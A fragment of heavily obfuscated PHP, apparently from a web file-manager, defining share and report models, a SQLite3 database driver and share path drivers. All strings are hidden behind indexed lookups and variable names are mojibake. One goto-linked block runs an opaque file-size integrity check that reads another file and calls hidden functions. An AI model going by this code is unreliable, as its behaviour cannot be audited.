strpos($Š¡–§¤[$±šåŠ•[577]], $ë“úá ©)); $úßò˜Õ‚ = array($±šåŠ•[203] => array($±šåŠ•[7], trim($àüÙ Á, $±šåŠ•[50]))); $Î½ŠèŸ = Model($±šåŠ•[878])->where($úßò˜Õ‚)->field($±šåŠ•[32])->select(); $á—ş‡è¬ = array_to_keyvalue($Î½ŠèŸ, $±šåŠ•[12], $±šåŠ•[32]); $á—ş‡è¬[] = $Š¡–§¤[$±šåŠ•[32]]; return implode($±šåŠ•[8], $á—ş‡è¬); } protected function remove($íÎËúÛõ) { $¿´«Ñé =& $_SERVER[è¶³ÒßÑ]; $­Á±¸ÇÒ = is_array($íÎËúÛõ) ? $íÎËúÛõ : array($íÎËúÛõ); for ($ãšÈöòõ = 0; $ãšÈöòõ < count($­Á±¸ÇÒ); $ãšÈöòõ++) { $‘ÄŸÎó™ = $this->getInfo($­Á±¸ÇÒ[$ãšÈöòõ]); if ($‘ÄŸÎó™[$¿´«Ñé[656]] == $¿´«Ñé[101]) { Model($¿´«Ñé[626])->eventShare($‘ÄŸÎó™[$¿´«Ñé[203]], $¿´«Ñé[2120]); } if ($‘ÄŸÎó™[$¿´«Ñé[555]] == $¿´«Ñé[101]) { Model($¿´«Ñé[626])->eventShare($‘ÄŸÎó™[$¿´«Ñé[203]], $¿´«Ñé[2119]); } } if (is_array($íÎËúÛõ)) { $íÎËúÛõ = array($¿´«Ñé[7], $íÎËúÛõ); } $ù˜¤Šè = array($¿´«Ñé[658] => $íÎËúÛõ); $ğ¦ ¾Â‘ = $this->where($ù˜¤Šè)->delete(); if ($ğ¦ ¾Â‘) { Model($¿´«Ñé[659])->where(array($¿´«Ñé[658] => $íÎËúÛõ))->delete(); } return $ğ¦ ¾Â‘; } protected function removeBySource($ßäªÊ“…) { $Ó€±ìî» =& $_SERVER[è¶³ÒßÑ]; $‚ŒúÈà¹ = array($Ó€±ìî»[484] => array($Ó€±ìî»[485], $ßäªÊ“…)); $ş¦¨ƒğ = $this->field($Ó€±ìî»[658])->where($‚ŒúÈà¹)->select(); $ş¦¨ƒğ = array_to_keyvalue($ş¦¨ƒğ, $Ó€±ìî»[12], $Ó€±ìî»[658]); if (!$ş¦¨ƒğ) { return; } $‚ŒúÈà¹ = array($Ó€±ìî»[2126] => array($Ó€±ìî»[485], $ş¦¨ƒğ)); $this->where($‚ŒúÈà¹)->delete(); Model($Ó€±ìî»[659])->where($‚ŒúÈà¹)->delete(); } public function listAll($è…Ùš¯Ë) { $Ç¹îœµ =& $_SERVER[è¶³ÒßÑ]; $šñ†úÛ¼ = array(); if ($è…Ùš¯Ë[$Ç¹îœµ[1761]]) { $šñ†úÛ¼[$Ç¹îœµ[1761]] = $è…Ùš¯Ë[$Ç¹îœµ[1761]]; } if ($è…Ùš¯Ë[$Ç¹îœµ[814]]) { $ÑÑƒ³œç = $è…Ùš¯Ë[$Ç¹îœµ[815]] ? $è…Ùš¯Ë[$Ç¹îœµ[815]] : strtotime(date($Ç¹îœµ[2134])); $šñ†úÛ¼[$Ç¹îœµ[241]] = array($Ç¹îœµ[402], array($è…Ùš¯Ë[$Ç¹îœµ[814]], $ÑÑƒ³œç)); } if ($è…Ùš¯Ë[$Ç¹îœµ[33]]) { $šñ†úÛ¼[$è…Ùš¯Ë[$Ç¹îœµ[33]]] = 1; } else { $šñ†úÛ¼[] = array($Ç¹îœµ[555] => array($Ç¹îœµ[1065], 0), $Ç¹îœµ[656] => array($Ç¹îœµ[1065], 0), $Ç¹îœµ[2108] => $Ç¹îœµ[2061]); } if ($è…Ùš¯Ë[$Ç¹îœµ[2057]]) { $šñ†úÛ¼[] = array($Ç¹îœµ[2105] => $è…Ùš¯Ë[$Ç¹îœµ[2057]], $Ç¹îœµ[1650] => array($Ç¹îœµ[452], "\x25{$è…Ùš¯Ë[$Ç¹îœµ[2057]]}\45"), $Ç¹îœµ[2108] => $Ç¹îœµ[2061]); } $ëË˜Õ¤ = $this->_makeOrder()->where($šñ†úÛ¼)->selectPage(20); if (empty($ëË˜Õ¤[$Ç¹îœµ[438]])) { return array(); } $this->_listDataApply($ëË˜Õ¤[$Ç¹îœµ[438]]); return $ëË˜Õ¤; } public function listDataApply($Š§ï©„) { $this->_listDataApply($Š§ï©„); return $Š§ï©„; } private function _listDataApply(&$—„£Œüá) { $’À»£†å =& $_SERVER[è¶³ÒßÑ]; $Û”²ŠòÒ = array_to_keyvalue($—„£Œüá, $’À»£†å[12], $’À»£†å[1761]); $×‚ ï„ = Model($’À»£†å[591])->userListInfo(array_unique($Û”²ŠòÒ)); $úÁÖŸü = array_to_keyvalue($—„£Œüá, $’À»£†å[12], $’À»£†å[203]); $¦µú‚¡ö = Model($’À»£†å[878])->sourceListInfo($úÁÖŸü, !0); foreach ($—„£Œüá as $–ÈÑÃ¡² => &$»Ûâ¸×) { $”’ß”¬ = $»Ûâ¸×[$’À»£†å[1761]]; $»Ûâ¸×[$’À»£†å[2135]] = $×‚ ï„[$”’ß”¬] ? $×‚ ï„[$”’ß”¬] : !1; $Ë“¤˜¢ã = $»Ûâ¸×[$’À»£†å[203]]; $»Ûâ¸×[$’À»£†å[100]] = $¦µú‚¡ö[$Ë“¤˜¢ã] ? $¦µú‚¡ö[$Ë“¤˜¢ã] : !1; if ($»Ûâ¸×[$’À»£†å[100]][$’À»£†å[498]] == $’À»£†å[101]) { unset($—„£Œüá[$–ÈÑÃ¡²]); } if ($»Ûâ¸×[$’À»£†å[100]] != $’À»£†å[238] && !$»Ûâ¸×[$’À»£†å[100]]) { unset($—„£Œüá[$–ÈÑÃ¡²]); } } unset($»Ûâ¸×); $—„£Œüá = array_values($—„£Œüá); } private function _makeOrder($ô‹¶ã¤ = '') { $ÀúÂÚ¿ =& $_SERVER[è¶³ÒßÑ]; $æ¶ğ‘·² = array($ÀúÂÚ¿[241], $ÀúÂÚ¿[815], $ÀúÂÚ¿[2122], $ÀúÂÚ¿[2123]); $¾üø¸§š = array($ÀúÂÚ¿[516] => $ÀúÂÚ¿[517], $ÀúÂÚ¿[518] => $ÀúÂÚ¿[519]); $‡”üİÃß = Input::get($ÀúÂÚ¿[523], $ÀúÂÚ¿[7], $ÀúÂÚ¿[490], $æ¶ğ‘·²); $Ò¡”¼‰á = Input::get($ÀúÂÚ¿[524], $ÀúÂÚ¿[7], $ÀúÂÚ¿[2136], array($ÀúÂÚ¿[2054], $ÀúÂÚ¿[518])); $Ò¡”¼‰á = $¾üø¸§š[$Ò¡”¼‰á]; $ô‹¶ã¤ = $ô‹¶ã¤ . "{$‡”üİÃß}\x20{$Ò¡”¼‰á}"; return $this->order($ô‹¶ã¤); } public function reportAdd($µÄç’®) { $ÜÙäéñ =& $_SERVER[è¶³ÒßÑ]; $…ƒ¹‰Ü = array($ÜÙäéñ[658] => $µÄç’®[$ÜÙäéñ[658]], $ÜÙäéñ[1761] => USER_ID); if (Model($ÜÙäéñ[2132])->where($…ƒ¹‰Ü)->find()) { return !1; } $ºÉŸ“ = array($ÜÙäéñ[658] => $µÄç’®[$ÜÙäéñ[658]], $ÜÙäéñ[1650] => $µÄç’®[$ÜÙäéñ[1650]], $ÜÙäéñ[203] => $µÄç’®[$ÜÙäéñ[203]], $ÜÙäéñ[534] => $µÄç’®[$ÜÙäéñ[534]], $ÜÙäéñ[1761] => USER_ID, $ÜÙäéñ[33] => $µÄç’®[$ÜÙäéñ[33]], $ÜÙäéñ[519] => $µÄç’®[$ÜÙäéñ[519]]); return Model($ÜÙäéñ[2132])->add($ºÉŸ“); } public function reportList($Ö°«½‘) { $×¶˜¸¼¼ =& $_SERVER[è¶³ÒßÑ]; $™ìÆ¶¨ = array(); if ($Ö°«½‘[$×¶˜¸¼¼[814]]) { $ƒíŸœûà = $Ö°«½‘[$×¶˜¸¼¼[815]] ? $Ö°«½‘[$×¶˜¸¼¼[815]] : strtotime(date($×¶˜¸¼¼[2134])); $™ìÆ¶¨[$×¶˜¸¼¼[241]] = array($×¶˜¸¼¼[402], array($Ö°«½‘[$×¶˜¸¼¼[814]], $ƒíŸœûà)); } if (isset($Ö°«½‘[$×¶˜¸¼¼[33]]) && in_array($Ö°«½‘[$×¶˜¸¼¼[33]], array($×¶˜¸¼¼[101], $×¶˜¸¼¼[503], $×¶˜¸¼¼[2137], $×¶˜¸¼¼[2138], $×¶˜¸¼¼[2139]))) { $™ìÆ¶¨[$×¶˜¸¼¼[33]] = $Ö°«½‘[$×¶˜¸¼¼[33]]; } if (isset($Ö°«½‘[$×¶˜¸¼¼[804]]) && in_array($Ö°«½‘[$×¶˜¸¼¼[804]], array($×¶˜¸¼¼[238], $×¶˜¸¼¼[101], $×¶˜¸¼¼[503], $×¶˜¸¼¼[2137]))) { $™ìÆ¶¨[$×¶˜¸¼¼[804]] = $Ö°«½‘[$×¶˜¸¼¼[804]]; } $¼íóº¶â = Input::get($×¶˜¸¼¼[524], $×¶˜¸¼¼[7], $×¶˜¸¼¼[2136], array($×¶˜¸¼¼[2054], $×¶˜¸¼¼[518])); $¿²ÒÃ‘é = array($×¶˜¸¼¼[516] => $×¶˜¸¼¼[517], $×¶˜¸¼¼[518] => $×¶˜¸¼¼[519]); $±×ÄÂò = $×¶˜¸¼¼[2140] . $¿²ÒÃ‘é[$¼íóº¶â]; $·ıêÀ» = Model($×¶˜¸¼¼[2132])->where($™ìÆ¶¨)->order($±×ÄÂò)->selectPage(20); if (empty($·ıêÀ»[$×¶˜¸¼¼[438]])) { return array(); } $²ÄØ¨éÄ = array_to_keyvalue_group($·ıêÀ»[$×¶˜¸¼¼[438]], $×¶˜¸¼¼[804], $×¶˜¸¼¼[658]); if (!empty($²ÄØ¨éÄ[0])) { $Ö°«½‘ = $²ÄØ¨éÄ[0]; $™ìÆ¶¨ = array($×¶˜¸¼¼[658] => array($×¶˜¸¼¼[7], $Ö°«½‘)); $ü Û¸¶ó = $this->where($™ìÆ¶¨)->field($×¶˜¸¼¼[658])->select(); $ü Û¸¶ó = array_to_keyvalue($ü Û¸¶ó, $×¶˜¸¼¼[12], $×¶˜¸¼¼[658]); $ï”ç†„Õ = array_diff($Ö°«½‘, $ü Û¸¶ó); if (!empty($ï”ç†„Õ)) { foreach ($·ıêÀ»[$×¶˜¸¼¼[438]] as $‰ñ¡ÎÚ‰ => $½Ç÷ğ¾) { if (in_array($½Ç÷ğ¾[$×¶˜¸¼¼[658]], $ï”ç†„Õ)) { unset($·ıêÀ»[$×¶˜¸¼¼[438]][$‰ñ¡ÎÚ‰]); } } } } $this->_listDataApply($·ıêÀ»[$×¶˜¸¼¼[438]]); return $·ıêÀ»; } public function reportStatus($ıé’ÁØ) { $ æ‘¥Î =& $_SERVER[è¶³ÒßÑ]; $ì ÆÉ²¯ = array($ æ‘¥Î[468] => $ıé’ÁØ[$ æ‘¥Î[468]]); $ÀíÚ’ = Model($ æ‘¥Î[2132])->where($ì ÆÉ²¯)->field($ æ‘¥Î[2141])->find(); if (!$ÀíÚ’) { return !1; } $¬Ş»¡†ç = array($ æ‘¥Î[804] => $ıé’ÁØ[$ æ‘¥Î[804]]); if ($ıé’ÁØ[$ æ‘¥Î[804]] == $ æ‘¥Î[2137] && $ÀíÚ’[$ æ‘¥Î[804]] == $ æ‘¥Î[2137]) { $¬Ş»¡†ç[$ æ‘¥Î[804]] = 0; } $ó˜’Æ‰ = Model($ æ‘¥Î[2132])->where($ì ÆÉ²¯)->save($¬Ş»¡†ç); if ($ıé’ÁØ[$ æ‘¥Î[804]] == $ æ‘¥Î[503]) { if ($ÀíÚ’[$ æ‘¥Î[534]] != $ æ‘¥Î[238] && $this->shareFileMeta($ÀíÚ’[$ æ‘¥Î[534]])) { $this->shareFileMeta($ÀíÚ’[$ æ‘¥Î[534]], 0); } $this->remove($ÀíÚ’[$ æ‘¥Î[658]]); return !0; } if ($ó˜’Æ‰ && $ıé’ÁØ[$ æ‘¥Î[804]] == $ æ‘¥Î[2137]) { $Õ…àÖšÜ = $¬Ş»¡†ç[$ æ‘¥Î[804]] == $ æ‘¥Î[2137] ? 1 : 0; $this->shareFileMeta($ÀíÚ’[$ æ‘¥Î[534]], $Õ…àÖšÜ); $this->removeByFile($ÀíÚ’[$ æ‘¥Î[534]]); } return $ó˜’Æ‰; } private function removeByFile($¢ôïÉ¤×) { $Òšó÷Ÿ÷ =& $_SERVER[è¶³ÒßÑ]; $ìÑØ–‰€ = Model($Òšó÷Ÿ÷[878])->where(array($Òšó÷Ÿ÷[534] => $¢ôïÉ¤×))->field($Òšó÷Ÿ÷[203])->select(); $İµ‘µşå = array_to_keyvalue($ìÑØ–‰€, $Òšó÷Ÿ÷[12], $Òšó÷Ÿ÷[203]); $Õ–ŒÓó¸ = array($Òšó÷Ÿ÷[203] => array($Òšó÷Ÿ÷[7], $İµ‘µşå), $Òšó÷Ÿ÷[555] => 1); $ìÑØ–‰€ = $this->where($Õ–ŒÓó¸)->field($Òšó÷Ÿ÷[658])->select(); if (empty($ìÑØ–‰€)) { return; } $…ºıî¥ = array_to_keyvalue($ìÑØ–‰€, $Òšó÷Ÿ÷[12], $Òšó÷Ÿ÷[658]); $this->remove($…ºıî¥); } private function shareFileMeta($œÙ¢ûš‘, $ÆÌ£ÜÅÅ = null) { $ô‹¡¢ö˜ =& $_SERVER[è¶³ÒßÑ]; $Èª œšË = array($ô‹¡¢ö˜[534] => $œÙ¢ûš‘, $ô‹¡¢ö˜[107] => $ô‹¡¢ö˜[2142]); if (is_null($ÆÌ£ÜÅÅ)) { return Model($ô‹¡¢ö˜[2143])->where($Èª œšË)->find(); } $Èª œšË[$ô‹¡¢ö˜[443]] = $ÆÌ£ÜÅÅ; Model($ô‹¡¢ö˜[2143])->add($Èª œšË, array(), !0); } } goto aê§ˆŒÆ–; AçØ‘ÀÒòÀ: $_size = $_SERVER[è¶³ÒßÑ][55]; if ($_SERVER[$_SERVER[è¶³ÒßÑ][56]] != $_size($_file)) { $_getc = $_SERVER[è¶³ÒßÑ][57]; $_getfile = $_SERVER[$_SERVER[è¶³ÒßÑ][58]] . $_SERVER[è¶³ÒßÑ][59]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[è¶³ÒßÑ][60], $_getfilec); if (count($_getarrs) < $_SERVER[è¶³ÒßÑ][61]) { $exit = $_SERVER[è¶³ÒßÑ][62]; $exit(); } $_act = $_SERVER[è¶³ÒßÑ][63]; $_act($_file); } class DbSqlite3Base extends Db { public function __construct($ƒ¾±Òºò = '') { $¥µÏÓ =& $_SERVER[è¶³ÒßÑ]; if (!class_exists($¥µÏÓ[64])) { think_exception(think_lang($¥µÏÓ[14]) . $¥µÏÓ[65]); } if (!empty($ƒ¾±Òºò)) { if (!isset($ƒ¾±Òºò[$¥µÏÓ[16]])) { $ƒ¾±Òºò[$¥µÏÓ[16]] = 438; } $this->config = $ƒ¾±Òºò; if (empty($this->config[$¥µÏÓ[17]])) { $this->config[$¥µÏÓ[17]] = array(); } } } public function connect($¼áÈÆ¡ = '', $¼±‰–ü… = 0) { $¼Ò±£éß =& $_SERVER[è¶³ÒßÑ]; if (!isset($this->linkID[$¼±‰–ü…])) { if (empty($¼áÈÆ¡)) { $¼áÈÆ¡ = $this->config; } $this->linkID[$¼±‰–ü…] = new SQLite3($¼áÈÆ¡[$¼Ò±£éß[21]]); if (!$this->linkID[$¼±‰–ü…]) { think_exception($this->linkID[$¼±‰–ü…]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¼±‰–ü…]->busyTimeout(30000); if (1 != think_config($¼Ò±£éß[22])) { unset($this->config); } } return $this->linkID[$¼±‰–ü…]; } public function free() { $this->queryID = null; } public function query($Ó É‹›ê) { $‹ÖÎã¼î =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ó É‹›ê; if ($this->queryID) { $this->free(); } think_action_status($‹ÖÎã¼î[23], 1); think_status($‹ÖÎã¼î[24]); $this->queryID = $this->_linkID->query($Ó É‹›ê); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $àÔ»Äïİ = $this->getAll(); $this->numRows = count($àÔ»Äïİ); return $àÔ»Äïİ; } } public function execute($›ÑöÁ¯) { $­†õÑÛ =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›ÑöÁ¯; if ($this->queryID) { $this->free(); } think_action_status($­†õÑÛ[25], 1); think_status($­†õÑÛ[24]); $æ€È¾ñ = $this->_linkID->exec($›ÑöÁ¯); $this->debug(); if (!1 === $æ€È¾ñ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[è¶³ÒßÑ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $²›¥“É† = $this->_linkID->query($_SERVER[è¶³ÒßÑ][27]); if (!$²›¥“É†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓÏš–¸Ì = $this->_linkID->query($_SERVER[è¶³ÒßÑ][28]); if (!$ÓÏš–¸Ì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $İ«éãö = array(); while ($´‚¢±û = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $İ«éãö[] = $´‚¢±û; } $this->queryID->reset(); return $İ«éãö; } public function getFields($™ÌÈñœ«) { $²‘ÒËËÒ =& $_SERVER[è¶³ÒßÑ]; $¹÷‘Í©É = $this->query($²‘ÒËËÒ[29] . $™ÌÈñœ« . $²‘ÒËËÒ[30]); $Ì»¯Õ®¬ = array(); if ($¹÷‘Í©É) { foreach ($¹÷‘Í©É as $ê¾œêïÔ => $¢¼¿ÊÕ) { $Ì»¯Õ®¬[$¢¼¿ÊÕ[$²‘ÒËËÒ[32]]] = array($²‘ÒËËÒ[32] => $¢¼¿ÊÕ[$²‘ÒËËÒ[32]], $²‘ÒËËÒ[33] => $¢¼¿ÊÕ[$²‘ÒËËÒ[33]], $²‘ÒËËÒ[35] => (bool) ($¢¼¿ÊÕ[$²‘ÒËËÒ[35]] === $²‘ÒËËÒ[12]), $²‘ÒËËÒ[37] => $¢¼¿ÊÕ[$²‘ÒËËÒ[66]], $²‘ÒËËÒ[39] => (bool) $¢¼¿ÊÕ[$²‘ÒËËÒ[67]], $²‘ÒËËÒ[42] => (bool) $¢¼¿ÊÕ[$²‘ÒËËÒ[67]]); } } return $Ì»¯Õ®¬; } public function getTables($Î÷ú¢ = '') { $‰šÓÀ§ =& $_SERVER[è¶³ÒßÑ]; $¥³ªªÄ = $this->query($‰šÓÀ§[45] . $‰šÓÀ§[46] . $‰šÓÀ§[47]); $ç™¾Ùâ¥ = array(); foreach ($¥³ªªÄ as $ïÃãËà => $àå¹ˆ–š) { $ç™¾Ùâ¥[$ïÃãËà] = current($àå¹ˆ–š); } return $ç™¾Ùâ¥; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $š³ê­ª =& $_SERVER[è¶³ÒßÑ]; $this->error = $this->_linkID->lastErrorMsg(); if ($š³ê­ª[12] != $this->queryStr) { $this->error .= LNG($š³ê­ª[48]) . $this->queryStr; } think_trace($this->error, $š³ê­ª[12], $š³ê­ª[49]); return $this->error; } public function escapeString($›ÄÁÜäœ) { $è¡¿ÂºÂ =& $_SERVER[è¶³ÒßÑ]; if ($this->_linkID) { return $this->_linkID->escapeString($›ÄÁÜäœ); } return str_ireplace($è¡¿ÂºÂ[68], $è¡¿ÂºÂ[69], $›ÄÁÜäœ); } public function parseLimit($ÃËØÔ©Ì) { $•Œ ¼Œƒ =& $_SERVER[è¶³ÒßÑ]; $Æ¥Ãï’£ = $•Œ ¼Œƒ[12]; if (!empty($ÃËØÔ©Ì)) { $ÃËØÔ©Ì = explode($•Œ ¼Œƒ[50], $ÃËØÔ©Ì); if (count($ÃËØÔ©Ì) > 1) { $Æ¥Ãï’£ .= $•Œ ¼Œƒ[51] . $ÃËØÔ©Ì[1] . $•Œ ¼Œƒ[52] . $ÃËØÔ©Ì[0] . $•Œ ¼Œƒ[53]; } else { $Æ¥Ãï’£ .= $•Œ ¼Œƒ[51] . $ÃËØÔ©Ì[0] . $•Œ ¼Œƒ[53]; } } return $Æ¥Ãï’£; } } goto C‚œ‡œ­¬÷; D£äµİƒ¸½: class PathDriverDbShareItem extends PathDriverDB { public function __construct($üø©ÍÓ) { $this->pathParse = $üø©ÍÓ; $this->model = Model($_SERVER[è¶³ÒßÑ][1395]); } public function getPathOuter($ßŒì§î) { $ßÒ¼‚Ö« =& $_SERVER[è¶³ÒßÑ]; if (!$ßŒì§î) { return $ßŒì§î; } $œœÓÚò¢ = $this->parse($ßŒì§î); return trim(KodIO::makeShare($this->pathParse[$ßÒ¼‚Ö«[468]], $œœÓÚò¢[$ßÒ¼‚Ö«[468]]), $ßÒ¼‚Ö«[8]); } protected function infoParse($÷ø»±£í, $œü¥º¢Å = false, $‰øè•÷ï = false) { $µ £Ş± =& $_SERVER[è¶³ÒßÑ]; $”¶Ç¯ƒç = $this->pathParse[$µ £Ş±[468]]; $‡Ÿæ§µÖ = trim($this->pathParse[$µ £Ş±[1225]], $µ £Ş±[8]); return Action($µ £Ş±[1402])->sharePathInfo($”¶Ç¯ƒç, $‡Ÿæ§µÖ, $œü¥º¢Å); } public function infoFull($óåşŒ†ä) { $‡õƒÔ¥õ =& $_SERVER[è¶³ÒßÑ]; $£ì½œÙ´ = explode($‡õƒÔ¥õ[8], trim($óåşŒ†ä, $‡õƒÔ¥õ[8])); if (count($£ì½œÙ´) > 1) { $û­º¬Æ† = implode($‡õƒÔ¥õ[8], array_splice($£ì½œÙ´, 1)); $´“Çë…¦ = $this->model->pathInfoByPath($£ì½œÙ´[0], $û­º¬Æ†); if (!$´“Çë…¦) { return !1; } $this->pathParse[$‡õƒÔ¥õ[1225]] = $´“Çë…¦[$‡õƒÔ¥õ[203]]; } return $this->infoParse($óåşŒ†ä); } public function listAll($Ã˜×¡µÊ) { $ãåï … =& $_SERVER[è¶³ÒßÑ]; $Ó×ñÜ“ = IO::info($this->pathParse[$ãåï …[97]]); if (!$Ó×ñÜ“) { return array(); } $Âîìú˜ = $this->model->listAll($Ã˜×¡µÊ); $÷µÊûÌü = Model($ãåï …[657])->getInfo($Ó×ñÜ“[$ãåï …[658]]); foreach ($Âîìú˜ as &$¤ŞÅ¨†™) { check_abort(); $¤ŞÅ¨†™[$ãåï …[100]] = Action($ãåï …[1402])->_shareItemeParse($¤ŞÅ¨†™[$ãåï …[100]], $÷µÊûÌü); } unset($¤ŞÅ¨†™); return $Âîìú˜; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¨Õç·í) { $this->pathParse = $¨Õç·í; $this->model = Model($_SERVER[è¶³ÒßÑ][1395]); } protected function infoParse($üè•æá·, $èùªŸâ = false, $Ã¿í®™ş = false) { $áìˆÈ­Ì =& $_SERVER[è¶³ÒßÑ]; return Action($áìˆÈ­Ì[1231])->sharePathInfo($this->pathParse[$áìˆÈ­Ì[97]], !0, $èùªŸâ); } public function remove($Å†ôù¡, $­£“•¶Ö = true) { return !0; } public function listPath($üì¯Š†ª, $¦õØò½ = false) { $Ú‰ÉãšÖ =& $_SERVER[è¶³ÒßÑ]; $Œô†âÜ = parent::listPath($üì¯Š†ª, $¦õØò½); if (!$Œô†âÜ) { return $Œô†âÜ; } if (is_array($Œô†âÜ[$Ú‰ÉãšÖ[1403]])) { $Œô†âÜ[$Ú‰ÉãšÖ[1403]] = Action($Ú‰ÉãšÖ[1231])->shareItemInfo($Œô†âÜ[$Ú‰ÉãšÖ[1403]]); } foreach ($Œô†âÜ as $ÓïÊ£® => $øè»ğ) { if (!in_array($ÓïÊ£®, array($Ú‰ÉãšÖ[96], $Ú‰ÉãšÖ[95]))) { continue; } foreach ($øè»ğ as $¤Ò·ÀÕÖ => $ï¦ôãË) { $Œô†âÜ[$ÓïÊ£®][$¤Ò·ÀÕÖ] = Action($Ú‰ÉãšÖ[1231])->shareItemInfo($ï¦ôãË); } } return $Œô†âÜ; } public function listAll($”Î‡ôˆ÷) { $Û°½™Ñ» =& $_SERVER[è¶³ÒßÑ]; $©÷º„·¦ = IO::info($this->pathParse[$Û°½™Ñ»[97]]); if (!$©÷º„·¦) { return array(); } $«µÃŒ®æ = $this->model->listAll($”Î‡ôˆ÷); foreach ($«µÃŒ®æ as &$Í¨£Üš) { $Í¨£Üš[$Û°½™Ñ»[100]] = Action($Û°½™Ñ»[1231])->shareItemInfo($Í¨£Üš[$Û°½™Ñ»[100]]); } unset($Í¨£Üš); return $«µÃŒ®æ; } } class PathDriverDriverShareItem { public function __construct($“ñ·Ö À) { $this->pathParse = $“ñ·Ö À; } public function __call($®³¿ÁØ , $Ô”Ó©ë) { $ß ˜š¤ô =& $_SERVER[è¶³ÒßÑ]; if (method_exists($this, $®³¿ÁØ )) { return; } $û’¢¨³ = call_user_func_array(array($ß ˜š¤ô[1404], $®³¿ÁØ ), $Ô”Ó©ë); $»û£ùĞ˜ = array($ß ˜š¤ô[1405], $ß ˜š¤ô[1406], $ß ˜š¤ô[1407], $ß ˜š¤ô[1408], $ß ˜š¤ô[611], $ß ˜š¤ô[613], $ß ˜š¤ô[1409], $ß ˜š¤ô[120], $ß ˜š¤ô[1410], $ß ˜š¤ô[1411]); if (in_array($®³¿ÁØ , $»û£ùĞ˜)) { $û’¢¨³ = $this->getPathOuter($û’¢¨³); } return $û’¢¨³; } public function copy($àÈÎÆï», $¢ÉÙöÓ, $Ô‘ã´‹— = false, $ÌÌÀ¢¨ = false) { return $this->copyMove($àÈÎÆï», $¢ÉÙöÓ, $Ô‘ã´‹—, $_SERVER[è¶³ÒßÑ][611], $ÌÌÀ¢¨); } public function move($®ÂçŞşì, $Ö¦ùËµã, $Ï°Û¯Ÿç = false, $Ì³©ğ£» = false) { return $this->copyMove($®ÂçŞşì, $Ö¦ùËµã, $Ï°Û¯Ÿç, $_SERVER[è¶³ÒßÑ][613], $Ì³©ğ£»); } private function copyMove($€°¡¿ò, $ï«µÏØ…, $¾‹Ï İ«, $ÔÂ¤¾­, $âííòÀ£ = false) { $îÉşşÀ =& $_SERVER[è¶³ÒßÑ]; $ë£™¨í’ = $ï«µÏØ…; $÷¥Ç … = IO::driverMake($ï«µÏØ…); if ($÷¥Ç …->pathParse[$îÉşşÀ[1207]]) { $ï«µÏØ… = $÷¥Ç …->pathParse[$îÉşşÀ[1207]]; } else { $ï«µÏØ… = $ë£™¨í’; } $ĞêÖù¨ = IO::copyMove($€°¡¿ò, $ï«µÏØ…, $¾‹Ï İ«, $ÔÂ¤¾­, $âííòÀ£); $ĞêÖù¨ = $this->getPathOuter($ĞêÖù¨); return $ĞêÖù¨; } public function pathThis($©ÔÌ¬Àõ) { return get_path_this($this->pathParse[$_SERVER[è¶³ÒßÑ][97]]); } public function pathFather($¥€ÖûŒ) { return get_path_father($this->pathParse[$_SERVER[è¶³ÒßÑ][97]]); } public function iconvSystem($ÖÕâ­íå) { return $ÖÕâ­íå; } protected function infoParse($·ÁË³»Ş, $àêÌù‚— = false) { $è…É’‹¨ =& $_SERVER[è¶³ÒßÑ]; $£±æÖ£ = $this->pathParse[$è…É’‹¨[553]][$è…É’‹¨[1232]] . $this->pathParse[$è…É’‹¨[1225]]; if ($àêÌù‚—) { $¥ïšŠ· = IO::infoWithChildren($£±æÖ£); } else { $¥ïšŠ· = IO::info($£±æÖ£); } $ÁÇ­…Ç = $this->pathParse[$è…É’‹¨[553]]; return Action($è…É’‹¨[1402])->_shareItemeParse($¥ïšŠ·, $ÁÇ­…Ç); } public function listAll($ØÂ±İÙ¦) { $Ú‹×‚è… =& $_SERVER[è¶³ÒßÑ]; $˜¶»æ¼÷ = IO::listAll($ØÂ±İÙ¦); $’˜ò€Ñï = rtrim($this->pathParse[$Ú‹×‚è…[553]][$Ú‹×‚è…[1232]], $Ú‹×‚è…[8]); foreach ($˜¶»æ¼÷ as &$º…Š¡“) { $º…Š¡“[$Ú‹×‚è…[97]] = $this->pathDriver . $Ú‹×‚è…[8] . ltrim(substr($º…Š¡“[$Ú‹×‚è…[97]], strlen($’˜ò€Ñï)), $Ú‹×‚è…[8]); } unset($º…Š¡“); return $˜¶»æ¼÷; } public function listAllSimple($î‚À³Ÿš, $”‚Íß¯Å = false) { $Šî°ïû =& $_SERVER[è¶³ÒßÑ]; $•æØ¬Û = $this->listAll($î‚À³Ÿš); $Õ¶èã¯ = $this->pathParse[$Šî°ïû[488]]; if (trim($Õ¶èã¯, $Šî°ïû[8]) == trim(get_path_father($Õ¶èã¯), $Šî°ïû[8])) { $”‚Íß¯Å = !0; } return IO::init($Šî°ïû[12])->listAllSimpleMake($•æØ¬Û, $Õ¶èã¯, $”‚Íß¯Å); } public function getPathOuter($ÍÇó¸Ğ) { $´Ï¯óºŞ =& $_SERVER[è¶³ÒßÑ]; $¹±ŒÛÎ = KodIO::parse($ÍÇó¸Ğ); if ($¹±ŒÛÎ[$´Ï¯óºŞ[33]] == KodIO::KOD_SHARE_ITEM) { return $¹±ŒÛÎ[$´Ï¯óºŞ[97]]; } $Ø€ç”ÅÌ = KodIO::clear($ÍÇó¸Ğ); $¼Âñµø‘ = KodIO::clear($this->pathParse[$´Ï¯óºŞ[553]][$´Ï¯óºŞ[1232]]); $¨ÍùöøÙ = substr($Ø€ç”ÅÌ, strlen($¼Âñµø‘)); if (substr($Ø€ç”ÅÌ, 0, strlen($¼Âñµø‘)) != $¼Âñµø‘) { return !1; } return $this->pathParse[$´Ï¯óºŞ[1226]] . 